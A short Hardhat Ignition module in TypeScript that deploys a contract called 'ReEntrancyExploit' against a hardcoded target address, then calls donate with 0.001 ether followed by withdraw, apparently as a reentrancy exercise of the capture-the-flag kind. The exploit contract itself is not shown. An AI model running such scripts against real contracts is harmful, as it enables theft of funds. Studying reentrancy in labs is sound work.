import { buildModule } from "@nomicfoundation/hardhat-ignition/modules";
import { parseEther } from "ethers";

export default buildModule("ReEntrancyModule", (m) => {
  const targetAddress = "0x3F0875bb12062df9970dffD7a288200c5e52Db78";
  const reEntrancy = m.contract("ReEntrancyExploit", [targetAddress]);
  
  m.call(reEntrancy, "donate", [], {
    value: parseEther("0.001")
  });

  m.call(reEntrancy, "withdraw", []);

  return { reEntrancy };
});